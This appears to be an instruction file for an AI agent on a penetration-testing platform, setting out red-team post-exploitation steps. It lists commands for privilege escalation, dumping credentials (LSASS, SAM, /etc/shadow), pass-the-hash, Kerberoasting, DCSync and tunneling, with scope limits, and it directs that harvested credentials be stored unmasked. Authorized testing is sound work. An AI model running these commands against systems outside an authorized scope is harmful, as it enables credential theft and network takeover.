---
name: redteam-ops
description: Use after gaining initial access or a usable credential to do post-exploitation — privilege escalation, credential collection, lateral movement, domain-specific work, tunneling and data collection, plus the evidence and boundary discipline for each step. Use when a worker intent involves "post-exploitation / privilege escalation / lateral movement / domain / internal network".
tags:
  cwe: [CWE-269, CWE-522, CWE-250, CWE-732]
  attack: [TA0004, TA0008, TA0006, TA0005, TA0010]
  class: [post-exploitation, privilege-escalation, lateral-movement, credential-access]
---

# Red Team Post-Exploitation Methodology

## Boundaries and Prohibitions

- Operate only within the scope of authorization, observing the [operational constraints]; perform minimal single-step verification, no bulk actions, no destruction.
- Do not delete or tamper with business data; for sensitive data, stop at the proof point (proving access is enough) — no bulk export, no retention, no exfiltration.
- For persistence, only "demonstrate feasibility" (record a fact describing the technique and conditions); **do not actually deploy** long-term backdoors.
- All operations must leave evidence (screenshots / command output / traffic IDs); write credentials and tokens into facts in **full** (no abbreviations, no masking — this is the ammunition for later lateral movement).

## Phase 0: Foothold Stabilization

1. Confirm identity and privileges: `whoami / id`, `whoami /priv` (Windows), `hostname`.
2. Confirm network position: `ip addr` / `ifconfig` / `route print`, marking reachable internal segments (which segments are worth pivoting into).
3. Map the defensive surface: whether EDR/AV is present (`ps aux | grep -i defend`, Windows Defender events), and whether egress is restricted.
4. **First record a fact** capturing "initial access point + identity + reachable segments" — later intents build on it.

## Phase 1: Privilege Escalation

### Linux quick reference
- `sudo -l` (check against GTFOBins); whether `id` shows docker/lxd/disk group membership;
- SUID: `find / -perm -4000 -type f 2>/dev/null` (check against GTFOBins);
- Scheduled tasks: `cat /etc/crontab`, `ls -la /etc/cron.d/`, `crontab -l` (a writable script = privilege escalation);
- Writable service configs: `systemctl list-units --type=service` + `ls -la /etc/systemd/system/`;
- Kernel/distro version → `search_vulns` for local privilege-escalation CVEs (first `uname -a`, `cat /etc/os-release`);
- Environment and history: `env`, `~/.bash_history`, `~/.ssh/`, writability of `/etc/passwd`;
- Plan to use linpeas/pspy (host tools installed): save `linpeas.sh` output as an evidence file.

### Windows quick reference
- `whoami /priv`: SeImpersonate/SeAssignPrimaryToken → Potato family; SeDebug → inject into LSASS;
- `whoami /groups`: local admin / domain group membership;
- Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i "auto"`;
- Scheduled tasks and service permissions: `schtasks /query /fo LIST /v`, `accesschk.exe`;
- Stored credentials: `cmdkey /list`, browser config, `Get-ChildItem -Recurse -Force $env:APPDATA`;
- Use winPEAS for a comprehensive check (host tool).

## Phase 2: Credential Collection

- Linux: `/etc/shadow` (if readable), application configs (.env / config.php / application.yml / settings.py),
  SSH private keys, database connection strings, cloud metadata (see the cloud skill), CI/CD tokens;
- Windows: LSASS dump (requires privileges), SAM/SYSTEM, DPAPI, Group Policy Preferences (GPP);
- With each set of credentials obtained: **immediately record a fact** (username/password or hash/source host/applicable service), and use `auth_request`
  to assemble a verification request (HTTP side) or `netexec`/`smbclient` to verify (SMB side);
- **Don't guess credentials**: at most 2-3 attempts before determining the lockout policy; check `net accounts` before password-spraying domain accounts.

## Phase 3: Lateral Movement

1. Connect directly with existing credentials: SSH/RDP/SMB/WinRM/database (first `nmap -sV -p 22,445,3389,5985,1433` to confirm the open surface);
2. impacket: `psexec.py` / `wmiexec.py` / `smbexec.py` / `secretsdump.py` (command wrappers included);
3. Pass-the-hash / Pass-the-ticket: `impacket-wmiexec -hashes :<NTLM> user@host`;
4. Tunneling: `chisel` (HTTP tunnel), `ligolo-ng` (TUN), `ssh -D` (socks5); prefer forms allowed by the target's egress policy;
5. Converge lateral scanning: only target segments with proven ownership, `nmap -sT --top-ports 100 -iL ips.txt`;
6. Record provenance at every hop: from which host, with which credentials, to which host — a missing link in the fact chain makes the report untrustworthy.

## Phase 4: Windows Domain Environment

- Enumeration: `net user /domain`, `net group "Domain Admins" /domain`, `Get-ADUser -Filter *`;
- Kerberoasting: `impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request` → hashcat -m 13100;
- AS-REP: `impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -format hashcat`;
- DCSync: `impacket-secretsdump domain/admin:pass@dc` (requires Replicating Directory Changes permission);
- ADCS: `certipy find -u user@domain -p pass -dc-ip dc` (ESC1-ESC8 template misconfigurations);
- Delegation: `impacket-findDelegation`;
- Attack-path visualization is optional with BloodHound (SharpHound collection → analysis); write key paths into a fact.

## Phase 5: Data Acquisition and Objective Achievement

- First clarify "what to prove": admin access / a class of data readable / an endpoint controllable — prove with minimal reads, no database dumping;
- Read-only database proof: `SELECT ... LIMIT 1`; take only a single file sample;
- Every data read must call `save_evidence` and be accountable for source_url/filename;
- Register **new services/assets discovered via internal lateral movement into the asset store** (`insert_assets` / `add_task_scope`),
  and use `list_untested_assets` to plan the next step for untested assets.

## Callbacks and C2 (built into the platform, don't build your own)

- `listener_start` starts a listener and returns the resolved callback address; generate the payload directly with that address;
- Callbacks land in `listener_sessions`; leave evidence per session; **do not** build your own public C2;
- Use the egress form defined by the platform C2 config (direct / SSH relay / manual); don't open public ports on your own.

## Evidence and Failure Handling

- Record a fact even on failure ("tested X, no Y") to avoid repeated attempts and duplicated report narrative;
- If a privilege-escalation/lateral-movement attempt is blocked (EDR/WAF/policy) → record the blocking form and preconditions; don't keep hammering it;
- confidence: directly observed = observed, inferred = inferred; an inference cannot be promoted to finding evidence.
